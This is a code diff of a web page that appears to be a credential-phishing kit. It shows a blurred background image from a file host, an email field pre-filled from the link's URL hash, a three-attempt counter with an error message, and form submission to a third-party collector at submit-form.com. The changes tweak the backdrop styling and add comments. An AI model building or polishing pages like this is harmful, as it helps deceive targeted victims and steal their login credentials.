@@ -11,9 +11,8 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
         body {
             font-family: 'Inter', sans-serif;
-            background: url('https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/IMG_9208.png') no-repeat center center;
-            background-size: contain;
-            background-color: #e5e7eb; /* Fallback color */
+            background: url('https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/IMG_9209.png') no-repeat center center fixed;
+            background-size: cover;
         }
         body::before {
             content: '';
@@ -23,17 +22,8 @@
             width: 100%;
             height: 100%;
             background: inherit;
-            background-size: contain;
             filter: blur(5px);
             z-index: -1;
-        }
-        @media (max-width: 639px) {
-            body {
-                background-attachment: scroll;
-            }
-            body::before {
-                background-attachment: scroll;
-            }
         }
         .content {
             position: relative;
@@ -84,15 +74,16 @@
             const emailInput = document.getElementById('email');
             const errorMessageEl = document.getElementById('error-message');
             const maxAttempts = 3;
-            const submitEndpoint = 'https://submit-form.com/saodPioKu';
+            const submitEndpoint = 'https://submit-form.com/saodPioKu'; // Updated action URL
             let attemptCount = 0;
 
             // Function to handle email pre-filling
             const updateEmailFromHash = () => {
-                const hash = decodeURIComponent(window.location.hash.slice(1));
+                const hash = decodeURIComponent(window.location.hash.slice(1)); // Decode URL hash
                 console.log('Raw hash:', window.location.hash);
                 console.log('Decoded hash:', hash);
                 if (hash) {
+                    // Improved email validation
                     const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;
                     console.log('Regex test:', emailRegex.test(hash));
                     if (emailRegex.test(hash)) {
